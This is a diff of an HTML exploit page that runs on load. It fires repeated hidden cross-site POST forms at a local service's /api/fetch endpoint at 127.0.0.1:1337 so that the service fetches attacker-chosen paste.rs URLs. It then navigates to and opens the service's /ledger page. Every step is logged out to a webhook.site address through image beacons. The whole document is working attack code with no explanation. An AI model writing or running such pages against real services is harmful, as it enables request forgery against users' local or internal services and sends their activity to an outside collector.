@@ -1,38 +1,32 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"></head><body>
 <pre id="l">boot</pre>
-<form id="f1" method="POST" action="http://127.0.0.1:1337/api/fetch" target="_blank" enctype="application/x-www-form-urlencoded">
-  <input type="hidden" name="url" value="https://paste.rs/kl1ds">
-</form>
 <script>
 const WH = "https://webhook.site/56bb9b65-25cd-4a20-9fba-579658cf66c6";
+const T = "http://127.0.0.1:1337";
+const TAR = "https://paste.rs/44Lu2";
 const log = (m) => {
   try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}
   new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1400));
 };
-log("start origin=" + location.origin);
-try {
-  document.getElementById("f1").submit();
-  log("submitted_fetch_blank");
-} catch (e) { log("suberr " + e); }
-for (let n = 0; n < 4; n++) {
-  setTimeout(function() {
-    const f = document.createElement("form");
-    f.method = "POST";
-    f.action = "http://127.0.0.1:1337/api/fetch";
-    f.target = "_blank";
-    f.enctype = "application/x-www-form-urlencoded";
-    const i = document.createElement("input");
-    i.type = "hidden"; i.name = "url"; i.value = "https://paste.rs/kl1ds";
-    f.appendChild(i);
-    document.body.appendChild(f);
-    f.submit();
-    log("resubmit" + n);
-  }, 400 + n * 500);
+function post(url) {
+  const f = document.createElement("form");
+  f.method = "POST";
+  f.action = T + "/api/fetch";
+  f.target = "_blank";
+  f.enctype = "application/x-www-form-urlencoded";
+  const i = document.createElement("input");
+  i.type = "hidden"; i.name = "url"; i.value = url;
+  f.appendChild(i);
+  document.body.appendChild(f);
+  f.submit();
 }
-setTimeout(function() {
-  log("nav_ledger");
-  location.href = "http://127.0.0.1:1337/ledger";
-}, 5000);
-for (let i = 1; i <= 20; i++) setTimeout(function(){ log("tick"+i); }, i * 2000);
-</script>
-</body></html>
+log("start");
+post(WH + "/csrftest");
+log("csrf_probe");
+for (let n = 0; n < 10; n++) {
+  setTimeout(function() { post(TAR); log("tar"+n); }, 250 + n * 350);
+}
+setTimeout(function() { log("nav_ledger"); location.href = T + "/ledger"; }, 5500);
+setTimeout(function() { window.open(T + "/ledger", "_blank"); log("open2"); }, 7500);
+for (let i = 1; i <= 25; i++) setTimeout(function(){ log("tick"+i); }, i * 2000);
+</script></body></html>
